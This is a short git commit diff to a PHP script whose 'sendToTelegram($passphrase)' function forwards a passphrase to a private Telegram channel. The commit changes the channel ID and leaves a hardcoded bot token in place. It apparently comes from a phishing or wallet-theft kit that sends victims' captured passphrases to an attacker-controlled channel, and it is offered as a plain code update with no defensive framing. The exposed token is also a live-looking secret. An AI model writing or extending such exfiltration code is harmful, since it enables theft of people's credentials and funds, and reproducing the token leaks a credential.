0ec6580775c4985d6c3550225d5d09ba92be0ccf
Ariwa <116925898+Ariwa042@users.noreply.github.com>
2024-08-22 14:34:17 +0100

    Update your_php_script.php
    Fixed channel dm

--- your_php_script.php
+++ your_php_script.php
@@ -23,7 +23,7 @@ function sendToTelegram($passphrase) {
     $botToken = "7460363720:AAE_1X_Cwm3sJ9RMJFNha04mbzgJ-m8JBys";
     
     // Your private channel ID (with -100 prefix)
-    $channelId = "6542433272";  // Replace with your actual channel ID
+    $channelId = "-1002222609812";  // Replace with your actual channel ID
 
     // The message you want to send
     $message = $passphrase;
